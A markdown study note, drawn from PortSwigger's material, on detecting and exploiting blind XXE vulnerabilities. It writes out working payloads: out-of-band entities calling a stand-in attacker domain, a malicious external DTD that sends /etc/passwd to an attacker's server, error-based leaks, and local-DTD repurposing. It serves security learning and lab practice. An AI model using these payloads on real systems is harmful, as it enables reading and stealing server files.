# BLIND XXE

- Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but doesn't return the values of any defined external entities within its responses.
- This means that direct retrieval of server-side files is not possible and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.
- There are 2 ways in which one can find  and exploit blind XXE vulnerabilities:
  1. Trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
  2. Trigger XML parsing errors in such a way that the error messages contain sensitive data.
  
## Detecting blind XXE using out-of-band(OAST) techniques.
- Detect blind XXE using the same technique as for XXE SSRF attacks but triggering the out-of-band network interaction to a system that you control.
- Eg you would define an external entity as follows:
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.webattacker.com"> ]>
```
You would then make use of the defined entity in a data value within the XML.
- This XXE attack causes the server to make a back-end HTTP request to the specified URL.
- The attacker can monitor for the resulting DNS lookup and HTTP request thereby detect that the XXE attack was successful.
- Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used, therefore, you might be able to use XML parameter entities instead.
- XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. Know the following:
1. The declaration of an XML parameter entity includes the percent character before the entity name:
```
<!ENTITY % myparameterentity "my parameter entity value" >
```
2. Parameter entities are referenced using the percent character instead of the usual ampersand:
```
%myparameterentity;
```
- This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.webattacker.com" > %xxe; ]>
```
- The XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD causing a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

### Exploiting blind XXE to exfiltrate data out-of-band
- Detecting a blind XXE vulnerability via out-of-band techniques is all very well but it doesn't actually demonstrate how the vulnerability could be exploited.
- What an attacker achieves is to exfiltrate sensitive data and can be done via a blind XXE vulnerability but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.
- An example of a malicious DTD to exfiltrate the contents of the `/etc/passwd` file is :
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#X25; exfiltrate SYSTEM 'http://webattacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
- This DTD carries out the following steps:
  1. Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
  2. Defines an XML parameter called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the `file` entity within the URL query string.
  3. Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.
  4. Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.
- The attacker must then host malicious DTD on a system that they control, normally by loading it onto their own webserver.
- Eg the attacker must serve the malicious DTD at the following URL:
```
http://website.com/malicious.dtd
```
- Finally the attacker must submit the following XXE payload to the vulnerable application:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://website.com/malicious.dtd"> %xxe; ]>
```
- This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD causing the XML parser to fetch the external DTD from the attacker's server and interpret it inline.
- The steps defined within the malicious DTD are then executed, and the `/etc/passwd` file is transmitted to the attacker's server.
- XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the `FTP protocol` instead of HTTP.
- Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as `/etc/hostname` can be targeted instead. 

### Exploiting blind XXE to retrieve data via error messages.
- Trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve.
- This will be effective if the application returns the resulting error message within its response.
- You can trigger an XML parsing message containing the contents of the `/etc/passwd` file using a malicious external DTD as:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
- This DTD carries out the following steps:
  1. Defines an XML parameter entity called `file` containing the contents of the `etc/passwd` file.
  2. Defines an XML parameter entity called `eval` containing a dynamic declaration of another XML parameter entity called `error` which will be evaluated by loading a nonexistent file whose name contains the value of the `file` entity.
  3. Uses the `eval` entity, which causes the dynamic declaration of the `error` entity to be performed.
  4. Uses the `error` entity so that its value evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.
- Invoking the malicious external DTD will result in an error message as below:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
... 
```
### Exploiting blind XXE by repurposing a local DTD
- The preceding works well with an external DTD but won't work with an internal DTD that is fully specified withon the `DOCTYPE` element because it involves using an XML parameter entity within the definition of another parameter entity.
- One can exfiltrate data via an out-of-band connecntion (when out-of-band interactions are blocked) and you can't load an external DTD from a remote server.
- It might still be possible to trigger error messages containing sensitive data, due to a loophole in the XML language specification.
- If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD.
- An attacker ccan employ the error-based XXE technique from within an internal DTD, provided the XML parameter entity that they use is redefining an entity that is declared within an external DTD.
- If out-of-band connections are blocked, then the external DTD cannot be loaded from a remote location, instead, it needs to be an external DTD file that is local to the application server.
- The attack involves invoking a DTD file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data.
- Suppose there is a DTD file on the server filesystem at the location `/usr/local/app/schema.dtd`, and this DTD file defines an entity called `custom_entity`. An attacker can trigger an XML parsing error message containing the contents of the `/etc/passwd` file by submitting a hybrid DTD like the following: 
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]> 
```
This DTD carries out the following steps:
  1. Defines an XML parameter entity called `local_dtd` containing the contents of the external DTD file that exists on the server filesystem.
  2. Redefines the XML parameter entity called `custom_entity` which is already defined in the external DTD file.
  3. Uses the `local_dtd` entity so that the external DTD is interpreted including the redefined value of the `custom_entity` entity resulting in the desired error message.
  
### Locating an existing DTD file to repurpose.
- This is straightforward because the application returns any error messages thrown by the XML parser, one can enumerate local DTD files just by attempting to load them from within the internal DTD.
- eg, Linux systems using GNOME desktop environment often have a DTD file at `/usr/share/yelp/dtd/docbookx.dtd`  which can be tested by submitted the following XXE payload whuch will cause an error if the file is missing:
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]> 
```
- After you have tested a list of common DTD files to locate a file that is present, you then need to obtain a copy of the file and review it to find an entity that you can redefine


--------------------------------------------------------------------------------
# MATERIALS
## Reference
- [PortSwigger](https://portswigger.net/web-security/xxe/blind)

## Labs
- [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
- [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
- [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
- [Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)
